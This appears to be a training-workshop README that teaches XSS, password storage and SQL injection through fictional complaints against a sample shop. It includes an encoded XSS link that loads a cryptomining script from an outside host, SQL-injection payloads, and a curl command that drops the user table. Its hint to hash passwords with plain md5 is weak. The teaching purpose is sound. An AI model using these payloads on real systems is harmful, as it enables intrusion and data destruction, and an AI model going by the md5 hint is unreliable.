# Safe Web Programming Workshop

A quick intro to a few common web vulnerabilities & easy ways to prevent them.

![](https://memegenerator.net/img/instances/31629044.jpg)


## Plot

You are the proud owner of best-ecomm-ever.com, the most successful web site ... TBD
In the past few days, you received tons of complaints from users who allegedly "were hurt" from "viruses from your site".

You don't believe them of-course (there are no viruses at your site..) but your attorney suggested you to take your site offline until you resolve those issue.

So.. you decided to take your site offline, download your code base, and to prove to each and every "allegedly hurt" user how wrong he is.      

## Some technical details
 
All your site code base available at this repo. The site was written with the state of the art technology using microservices architecture - TBD ...
```
|-services
 | |-serviceName
 | |-|-client
 | | |-server
 | | |-database
```

All the microservices can be run using the `run.sh` script:

```bash
./run.sh 
```

## Ben

You have received a complain from someone named Ben. Ben claims that after clicking on a facebook ad that promised him "a free jacket" from your site, his computer started to work very slow and his firewall began to throw warnings "like crazy". 

This is the link Ben was directed to - https://best-ecomm-ever.com/thank-you-page?name=QmVuPHNjcmlwdCB0eXBlPSd0ZXh0L2phdmFzY3JpcHQnIHNyYz0iaHR0cHM6Ly91cmlnNTUud2l4c2l0ZS5jb20vZXZpbC9fZnVuY3Rpb25zLWRldi9taW5pbmciIGFzeW5jICA%2BPC9zY3JpcHQ%2B
Ben asks you to solve this issue ASAP, otherwise, he sues you.

#### step number 1
Run your site locally and get to http://localhost:8081/thank-you-page?name=QmVuPHNjcmlwdCB0eXBlPSd0ZXh0L2phdmFzY3JpcHQnIHNyYz0iaHR0cHM6Ly91cmlnNTUud2l4c2l0ZS5jb20vZXZpbC9fZnVuY3Rpb25zLWRldi9taW5pbmciIGFzeW5jICA%2BPC9zY3JpcHQ%2B

Can you see something off at the page?

<details>
  <summary>Hint 1</summary>
  Take a look at the console.
</details>
<details>
  <summary>Hint 2</summary>
  Take a look at the network tab and at the site's DOM.
</details>

#### step number 2
Ok. Something is off here. Lets understand why it happens and examine the service.
Lets check the `thank-you-page` service code and understand what breaks the page.

<details>
  <summary>Hint 1</summary>
  How do we know TBD ..
</details>

#### step number 3
Fix TBD...

## Ana

You have received a complain from someone named Ana, who is super upset at you. She said she checks her email address twice a week at https://haveibeenpwned.com/ and yesterday she found her best-ecom-ever password there! 
Ana said that your database was leaked and wants you to commit that the new password she updates would never leak again. 

#### Exploring the database
It's time to make the way you save passwords more secure. Each service persists its data in a local sqllite DB, so lets explore the `login service` database. Open the terminal and type the following commands:
```{bash}
cd services/login/server/dal
sqlite3
.open db.sqlite
.schema user
select * from user limit(1);
```

We are going to abuse the database a bit, if you want to revent your changes just delete the `db.sqlite` file and run the login service (the db would be autogenerated).

- What is the current structure of the users table? 
- What is the way we authenticate users today? 
- Food for thoughts - is there a way to still be able to authenticate users without saving their passwords?

#### Making the database secure again 

Let's change the way we authenticate users (we don't need to actually migrate the users table at the DB, your DBA will take care of it later).
Instead of saving the password, lets save only its HASH!
Do that by applying changes ONLY to `security/services/login/server.js` , add one line (or more) between lines 14 - 15 and edit line 41!

You can run your log-in server and make sure your fix works by using http://localhost:8082/login-page.

A challenge for real pro - overcome [rainbow tables](https://www.geeksforgeeks.org/understanding-rainbow-table-attack/) by salting the passwords!

<details>
  <summary>Hint 1</summary>
   passwrod => md5(passwrod)
</details>
<details>
  <summary>Hint 2</summary>
   when saving TBD ...
</details>

## Nadir Hackerman

You have received an anonymous tip from someone named Nadir Hackerman, who said that your login page is exposed to sql injection attack and highly recommand you to fix that before someone sues you.

#### Sql injection attack (?)
You remember vaguely what sql injection attack is from your C.S lesson at the elementary school, so in case you need to refresh your memory take a quick look at [this video](https://www.youtube.com/watch?v=FwIUkAwKzG8) that explains what sql injection is.

Sounds spooky, how much damage could you get? run your log-in server, enter to http://localhost:8082/login-page and try using sql-injection in order to:
- Pick an existing user from the db / create a new user (using sign up or in any other way), then change the password of this user using sql injection.
- Delete all your users passowrds .
- Drop your user table. 
```
# example of editing 
UPDATE table SET password = something WHERE email = email;

# example of editing 
DROP table user;
```
<details>
  <summary>Hint 1</summary>
   try name = "' or 1=1 --
</details>

#### Fix the issue from the client side
Lets block the bad guys. 
- Try to add an `pattern` [tag](https://www.w3schools.com/tags/att_input_pattern.asp) to the email & password inputs at the `client.html` template, that would prevent sql injection from happening. Make sure that the attacks you performed at the previous questions do not work anymore. 
- Can you sleep well now, knowing that your login is secure from sel injections?

<details>
  <summary>No</summary>
   Run your log-in service, open your terminal and run the following command: 
   ```
   curl 'http://localhost:8082/signup' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-raw "email=bla@shtut.com&password=1'); DROP TABLE user; --" \
  --compressed
   ```

   Now you can move to the "No" section, we won't tell anyone you opened the `Yes` one.
</details>

<details>
  <summary>Yes</summary>
   You are right, validation at the client side is never enough (the attacker can use proxy, cUrl, or even to modify the client code locally). Apply the validations also at the server side both for authenticating and signing up.
   After you finish, try to attack the server again (by modifying the client code locally, using fetch or any other way) and make sure you're saty safe (and nobody sues you..)
</details>
